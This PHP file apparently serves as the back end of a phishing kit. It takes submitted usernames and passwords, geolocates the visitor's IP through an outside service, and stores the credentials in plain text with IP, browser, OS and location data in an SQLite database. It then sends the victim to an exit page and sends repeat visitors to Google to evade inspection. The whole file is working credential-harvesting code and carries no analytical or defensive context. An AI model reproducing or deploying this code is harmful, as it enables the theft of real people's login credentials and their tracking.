<?php

// Error display configuration
error_reporting(0); // Usando error_reporting en lugar de ini_set para la configuración de errores



if ($bloqueo_de_ip) {
    $archivo = 'ip_count.txt';
    $ip_usuario = $_SERVER['REMOTE_ADDR'];

    // Utilizar null coalescing operator para simplificar la lectura de archivos
    $conteo_ips = json_decode(file_exists($archivo) ? file_get_contents($archivo) : '{}', true);

    // Incrementar el conteo o inicializarlo si no existe
    $conteo_ips[$ip_usuario] = ($conteo_ips[$ip_usuario] ?? 0) + 1;

    file_put_contents($archivo, json_encode($conteo_ips));

    if ($conteo_ips[$ip_usuario] > 10) {
        header('Location: https://www.google.com');
        exit();
    }
}

$userp = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
// Obtener el User-Agent del cliente
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getBrowser(string $user_agent): string {
    return match(true) {
        str_contains($user_agent, 'MSIE') => 'Internet Explorer',
        str_contains($user_agent, 'Edge') => 'Microsoft Edge',
        str_contains($user_agent, 'Trident') => 'Internet Explorer',
        str_contains($user_agent, 'Opera Mini') => 'Opera Mini',
        str_contains($user_agent, 'OPR'), str_contains($user_agent, 'Opera') => 'Opera',
        str_contains($user_agent, 'Firefox') => 'Mozilla Firefox',
        str_contains($user_agent, 'Chrome') => 'Google Chrome',
        str_contains($user_agent, 'Safari') => 'Safari',
        default => 'No navegador'
    };
}

function getOS(string $user_agent): string {
    $os_array = [
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    ];
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            return $value;
        }
    }
    return "Unknown OS Platform";
}

// Obtener la dirección IP del cliente
$user_ip = $_SERVER['REMOTE_ADDR'];

// Obtener datos de localización usando geoplugin
$geo_data = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$user_ip"), true);
$pais = $geo_data['geoplugin_countryName'] ?? 'Desconocido';
$region = $geo_data['geoplugin_regionName'] ?? 'Desconocido';
$ciudad = $geo_data['geoplugin_city'] ?? 'Desconocido';

$user_os = getOS($user_agent);
$navegador = getBrowser($user_agent);

date_default_timezone_set('America/Bogota');

// Conectar o crear la base de datos SQLite
$db = new PDO('sqlite:datos_almacenados.db');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Crear la tabla si no existe
$query = "CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    usuario TEXT,
    clave TEXT,
    sistema_operativo TEXT,
    navegador TEXT,
    user_agent TEXT,
    ip TEXT,
    pais TEXT,
    region TEXT,
    ciudad TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)";
$db->exec($query);

// Capturar datos del POST
if (isset($_POST['usr'], $_POST['pss'])) {
    $stmt = $db->prepare("INSERT INTO users (usuario, clave, sistema_operativo, navegador, user_agent, ip, pais, region, ciudad) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
    $stmt->execute([
        htmlspecialchars($_POST['usr']),
        htmlspecialchars($_POST['pss']),
        htmlspecialchars($user_os),
        htmlspecialchars($navegador),
        htmlspecialchars($user_agent),
        htmlspecialchars($user_ip),
        htmlspecialchars($pais),
        htmlspecialchars($region),
        htmlspecialchars($ciudad)
    ]);

    header('Location: ../exit.html');
    exit();
}

 else {
    header('Location: ../exit.html');
    exit();
}
?>